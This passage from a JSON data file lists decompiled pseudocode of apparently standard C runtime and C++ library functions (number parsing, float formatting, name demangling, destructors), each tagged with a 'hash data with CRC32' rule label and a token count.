else if (uVar7 + 0xbf < 0x1a) {\n                    uVar8 = uVar7 - 0x37;\n                }\n                else {\n                    uVar8 = 0xffffffff;\n                }\n                if ((uVar8 == 0xffffffff) || (arg_14h <= uVar8)) break;\n                if ((var_ch < var_10h) || ((var_ch == var_10h && (uVar8 <= var_14h)))) {\n                    uVar9 = 8;\n                    var_ch = var_ch * arg_14h + uVar8;\n                }\n                else {\n                    uVar9 = 0xc;\n                }\n                uVar7 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n                var_8h = var_8h | uVar9;\n            }\n            fcn.00402dce(var_4h);\n            uVar9 = var_8h;\n            uVar8 = var_ch;\n            if ((var_8h & 8) == 0) {\n                uVar8 = 0;\n                arg_ch = var_18h;\n            }\n            else {\n                cVar2 = fcn.00401979(var_8h, var_ch);\n                if (cVar2 == '\\0') {\n                    if ((uVar9 & 2) != 0) {\n                        uVar8 = -uVar8;\n                    }\n                }\n                else {\n                    puVar3 = fcn.004039a4();\n                    *puVar3 = 0x22;\n                    if ((uVar9 & 1) == 0) {\n                        uVar8 = 0xffffffff;\n                    }\n                    else if ((uVar9 & 2) == 0) {\n                        uVar8 = 0x7fffffff;\n                    }\n                    else {\n                        uVar8 = 0x80000000;\n                    }\n                }\n            }\n            if (var_1ch != '\\0') {\n                *(var_28h + 0x350) = *(var_28h + 0x350) & 0xfffffffd;\n            }\n            goto code_r0x004be73e;\n        }\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    uVar8 = 0;\ncode_r0x004be73e:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return uVar8;\n}\n",
        "token_count": 1542
    },
    "004063d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004063d4(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00405a15();\n    if (cVar2 == '\\0') {\ncode_r0x004a1bcf:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00404278();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar6 = 0,  *(param_1 + 0x32) == 0x47)))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404bb5(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.00405911();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.0040579a(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a1bcf;\n            uVar4 = fcn.00405911();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x32);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.004030f8();\n            arg_10h = fcn.00405911();\n            fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.0040229d(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x32) == 0x67) || (*(param_1 + 0x32) == 0x47)) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405b23(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x32) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1172
    },
    "00406451": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406451(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_8h == 0) {\n        uVar1 = fcn.004adfa4(0);\n        return uVar1;\n    }\n    iVar2 = fcn.0040420a(arg_8h);\n    if (iVar2 == 0) {\n        if ((*(arg_8h + 0xc) >> 0xb & 1) != 0) {\n            uVar1 = fcn.00405f06(arg_8h);\n            iVar2 = fcn.00404732(uVar1);\n            if (iVar2 != 0) goto code_r0x004ae1e4;\n        }\n        uVar1 = 0;\n    }\n    else {\ncode_r0x004ae1e4:\n        uVar1 = 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 214
    },
    "0046b9ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b9ed(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0040682f();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00460120": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460120(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00403111();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004064b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004064b0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x44, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_unsigned_short_int_.0;\n            fcn.00404769(uVar4);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 368
    },
    "0046bcfc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bcfc(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0046225b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046225b(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0045dfab": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045dfab(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.type_info.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0046bc7b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bc7b(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00406730": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406730(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404bb5(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.00405911();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "0046baeb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046baeb(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00406785": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00406785(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == 'X') {\n        var_10h = \"void\";\n        var_ch = 4;\n    }\n    else {\n        if (**0x56f458 != 'Z') {\n            fcn.0040451b(&var_8h);\n            if (var_4h == '\\0') {\n                cVar1 = **0x56f458;\n                if (cVar1 != '\\0') {\n                    if (cVar1 != '@') {\n                        if (cVar1 != 'Z') {\n                            arg_8h[1] = 0;\n                            *arg_8h = 0;\n                            *(arg_8h + 1) = 2;\n                            return arg_8h;\n                        }\n                        *0x56f458 = *0x56f458 + 1;\n                        if ((~(*0x56f460 >> 0x12) & 1) == 0) {\n                            var_10h = \",<ellipsis>\";\n                            var_ch = 0xb;\n                        }\n                        else {\n                            var_10h = \",...\";\n                            var_ch = 4;\n                        }\n                        puVar2 = fcn.004050ba(&var_18h, &var_10h);\n                        *arg_8h = *puVar2;\n                        arg_8h[1] = puVar2[1];\n                        return arg_8h;\n                    }\n                    *0x56f458 = *0x56f458 + 1;\n                }\n            }\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        if ((~(*0x56f460 >> 0x12) & 1) == 0) {\n            var_10h = \"<ellipsis>\";\n            var_ch = 10;\n        }\n        else {\n            var_10h = 0x54f410;\n            var_ch = 3;\n        }\n    }\n    *0x56f458 = *0x56f458 + 1;\n    fcn.00402cfc(&var_10h);\n    return arg_8h;\n}\n",
        "token_count": 538
    },
    "0040683e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040683e(uint *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = **0x56f458;\n    pcVar5 = *0x56f458;\n    if (cVar1 == '\\0') {\ncode_r0x0048dc93:\n        *0x56f458 = pcVar5;\n        fcn.004012ad(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if ((('5' < cVar1) && (cVar1 < ':')) || (cVar1 == '_')) {\n        uVar6 = cVar1 - 0x36;\n        pcVar5 = *0x56f458 + 1;\n        if (uVar6 == 0x29) {\n            if (*pcVar5 == '\\0') goto code_r0x0048dc93;\n            *0x56f458 = *0x56f458 + 2;\n            uVar6 = *pcVar5 - 0x3d;\n            if ((uVar6 < 4) || (7 < uVar6)) {\n                uVar6 = 0xffffffff;\n            }\n        }\n        else {\n            *0x56f458 = pcVar5;\n            if ((uVar6 < 0) || (3 < uVar6)) goto code_r0x0048dc83;\n        }\n        if (uVar6 != 0xffffffff) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = *arg_ch;\n            var_4h = arg_ch[1];\n            if ((uVar6 & 2) != 0) {\n                if (**0x56f458 == '@') {\n                    *0x56f458 = *0x56f458 + 1;\n                }\n                else {\n                    var_14h = 2;\n                    var_18h = 0x54f380;\n                    fcn.00402cfc(&var_18h);\n                    fcn.004052f9(&var_18h, &var_8h);\n                    var_8h = var_18h;\n                    var_4h = var_14h;\n                    if (**0x56f458 == '\\0') {\n                        fcn.004017df(1);\n                        fcn.004052f9(&var_18h, &var_8h);\n                        var_8h = var_18h;\n                        var_4h = var_14h;\n                    }\n                    else {\n                        uVar2 = fcn.004039f4(&var_28h);\n                        fcn.00402e87(&var_18h, 0x20, uVar2);\n                        piVar3 = fcn.004052f9(&var_30h, &var_8h);\n                        var_8h = *piVar3;\n                        var_4h = piVar3[1];\n                    }\n                }\n                if (**0x56f458 == '\\0') {\n                    fcn.004017df(1);\n                    fcn.004052f9(arg_8h, &var_8h);\n                    return arg_8h;\n                }\n                if (**0x56f458 != '@') goto code_r0x0048dc83;\n                *0x56f458 = *0x56f458 + 1;\n                if ((*0x56f460 & 0x60) == 0x60) {\n                    uVar2 = fcn.004057a9(&var_30h);\n                    fcn.004068e3(uVar2);\n                }\n                else {\n                    puVar4 = fcn.004057a9(&var_30h);\n                    var_10h = *puVar4;\n                    var_ch = puVar4[1];\n                }\n            }\n            if ((uVar6 & 4) != 0) {\n                if ((~(*0x56f460 >> 1) & 1) == 0) {\n                    uVar2 = fcn.004050f6(&var_30h);\n                    fcn.004068e3(uVar2);\n                }\n                else {\n                    uVar2 = fcn.004050f6(&var_30h);\n                    fcn.00402e87(&var_28h, 0x20, uVar2);\n                    piVar3 = fcn.004052f9(&var_18h, &var_8h);\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n            }\n            if ((~(*0x56f460 >> 1) & 1) == 0) {\n                uVar2 = fcn.00403936(&var_30h);\n                fcn.004068e3(uVar2);\n            }\n            else {\n                fcn.00403936(&var_30h);\n                piVar3 = fcn.004052f9(&var_28h, &var_8h);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            if (*arg_ch != 0) {\n                fcn.00402e87(&var_30h, 0x28, &var_8h);\n                piVar3 = fcn.004032bf(&var_28h, 0x29);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            piVar3 = fcn.004051dc(8);\n            if (piVar3 == NULL) {\n                piVar3 = NULL;\n            }\n            else {\n                *piVar3 = 0;\n                piVar3[1] = 0;\n            }\n            fcn.00404165(&var_20h, piVar3);\n            uVar2 = fcn.00406785(&var_30h);\n            fcn.00402e87(&var_28h, 0x28, uVar2);\n            uVar2 = fcn.004032bf(&var_18h, 0x29);\n            fcn.00402eb9(uVar2);\n            if (((*0x56f460 & 0x60) != 0x60) && ((uVar6 & 2) != 0)) {\n                fcn.00402eb9(&var_10h);\n            }\n            if ((~(*0x56f460 >> 0x13) & 1) == 0) {\n                uVar2 = fcn.00402315(&var_30h);\n                fcn.004068e3(uVar2);\n            }\n            else {\n                uVar2 = fcn.00402315(&var_30h);\n                fcn.00402eb9(uVar2);\n            }\n            uVar2 = fcn.00401dca(&var_30h);\n            fcn.00402eb9(uVar2);\n            if ((~(*0x56f460 >> 8) & 1) == 0) {\n                uVar2 = fcn.004059d9(&var_30h);\n                fcn.004068e3(uVar2);\n            }\n            else {\n                uVar2 = fcn.004059d9(&var_30h);\n                fcn.00402eb9(uVar2);\n            }\n            if (piVar3 != NULL) {\n                *piVar3 = var_8h;\n                piVar3[1] = var_4h;\n                *arg_8h = var_20h;\n                arg_8h[1] = var_1ch;\n                return arg_8h;\n            }\n            arg_8h[1] = 0;\n            *(arg_8h + 1) = 3;\n            *arg_8h = 0;\n            return arg_8h;\n        }\n    }\ncode_r0x0048dc83:\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 1904
    },
    "00406893": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.00406893(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b358, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(8);\n    *(unaff_EBP + -4) = 0;\n    for (iVar3 = 3; *(unaff_EBP + -0x20) = iVar3,  iVar3 != *0x570058; iVar3 = iVar3 + 1) {\n        iVar2 = *(*0x57005c + iVar3 * 4);\n        if (iVar2 != 0) {\n            if ((*(iVar2 + 0xc) >> 0xd & 1) != 0) {\n                iVar2 = fcn.004029dc(*(*0x57005c + iVar3 * 4));\n                if (iVar2 != -1) {\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(*(*0x57005c + iVar3 * 4) + 0x20);\n            fcn.00406302(*(*0x57005c + iVar3 * 4));\n            *(*0x57005c + iVar3 * 4) = 0;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004ce529();\n    uVar1 = *(unaff_EBP + -0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 454
    },
    "004068a7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004068a7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a3cab;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a3cab;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a3cab:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004057e0(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.00406645(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0040508d(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "004602e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004602e0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.004050a6();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00462a6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462a6f(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00404fe8();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00487b4f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.00487b4f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t *piVar8;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uVar9;\n    uint var_4h;\n    \n    fcn.00402289(0x56ac30, 0x10);\n    iVar7 = 0;\n    puVar1 = *(unaff_EBP + 0x10);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && (-1 < *puVar1)))) {\n        iVar7 = 0;\n        goto code_r0x00487c77;\n    }\n    uVar2 = *puVar1;\n    piVar8 = *(unaff_EBP + 0xc);\n    if (-1 < uVar2) {\n        piVar8 = piVar8 + puVar1[2] + 0xc;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar5 = *0x56f3f0;\n    puVar3 = *(unaff_EBP + 0x14);\n    if (((uVar2 < '\\0') && ((*puVar3 & 0x10) != 0)) && (*(unaff_EBP + -0x1c) = *0x56f3f0,  iVar5 != 0)) {\n        (**0x573000)();\n        iVar5 = (**(unaff_EBP + -0x1c))();\ncode_r0x00487bc6:\n        if ((iVar5 == 0) || (piVar8 == NULL)) {\ncode_r0x00487c87:\n            fcn.00404e94();\n            pcVar4 = swi(3);\n            iVar7 = (*pcVar4)();\n            return iVar7;\n        }\n        *piVar8 = iVar5;\ncode_r0x00487c16:\n        iVar5 = fcn.004011b3(iVar5, puVar3 + 8);\n        *piVar8 = iVar5;\n    }\n    else {\n        iVar5 = *(unaff_EBP + 8);\n        if ((uVar2 & 8) != 0) {\n            iVar5 = *(iVar5 + 0x18);\n            goto code_r0x00487bc6;\n        }\n        if ((*puVar3 & 1) != 0) {\n            if ((*(iVar5 + 0x18) == 0) || (piVar8 == NULL)) goto code_r0x00487c87;\n            fcn.004058f3(piVar8, *(iVar5 + 0x18), *(puVar3 + 0x14));\n            if ((*(puVar3 + 0x14) != 4) || (*piVar8 == 0)) goto code_r0x00487c61;\n            iVar5 = *piVar8;\n            goto code_r0x00487c16;\n        }\n        iVar5 = *(iVar5 + 0x18);\n        if (*(puVar3 + 0x18) == 0) {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x00487c87;\n            uVar9 = *(puVar3 + 0x14);\n            uVar6 = fcn.004011b3(iVar5, puVar3 + 8);\n            fcn.004058f3(piVar8, uVar6, uVar9);\n        }\n        else {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x00487c87;\n            iVar7 = ((*puVar3 & 4) != 0) + 1;\n            *(unaff_EBP + -0x20) = iVar7;\n        }\n    }\ncode_r0x00487c61:\n    *(unaff_EBP + -4) = 0xfffffffe;\ncode_r0x00487c77:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return iVar7;\n}\n",
        "token_count": 1036
    },
    "00405b41": {
        "rules": [
